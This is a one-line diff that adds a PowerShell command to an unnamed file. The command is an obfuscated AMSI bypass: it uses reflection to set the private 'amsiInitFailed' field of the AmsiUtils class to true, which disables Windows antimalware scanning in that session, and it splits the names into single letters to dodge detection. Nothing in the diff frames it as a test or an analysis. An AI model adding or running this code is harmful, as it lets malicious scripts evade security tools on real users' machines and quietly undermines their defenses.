@@ -1,0 +1,1 @@
+[Ref].Assembly.GetType('System.Management.Automation.A'+'m'+'s'+'iUtils').GetField('a'+'m'+'s'+'i'+'I'+'n'+'itFailed','NonPublic,Static').SetValue($null,$true)
